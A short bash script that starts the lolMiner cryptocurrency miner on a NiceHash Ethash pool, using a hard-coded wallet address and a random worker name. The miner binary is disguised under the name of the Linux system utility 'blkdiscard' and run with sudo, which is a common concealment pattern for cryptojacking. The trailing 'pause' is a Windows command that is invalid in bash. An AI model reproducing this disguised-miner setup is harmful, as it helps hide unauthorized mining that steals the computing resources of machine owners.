#!/bin/bash

POOL=daggerhashimoto.usa.nicehash.com:3353
ETH_WALLET=367MbR3EwWh1qyYYkVYhFZF9tbpQmwBq25
YOUR_WORKER_NAME=$(echo $(shuf -i 1-9999 -n 1)-GPU)

cd "$(dirname "$0")"

chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool $POOL --user $ETH_WALLET.$YOUR_WORKER_NAME
pause

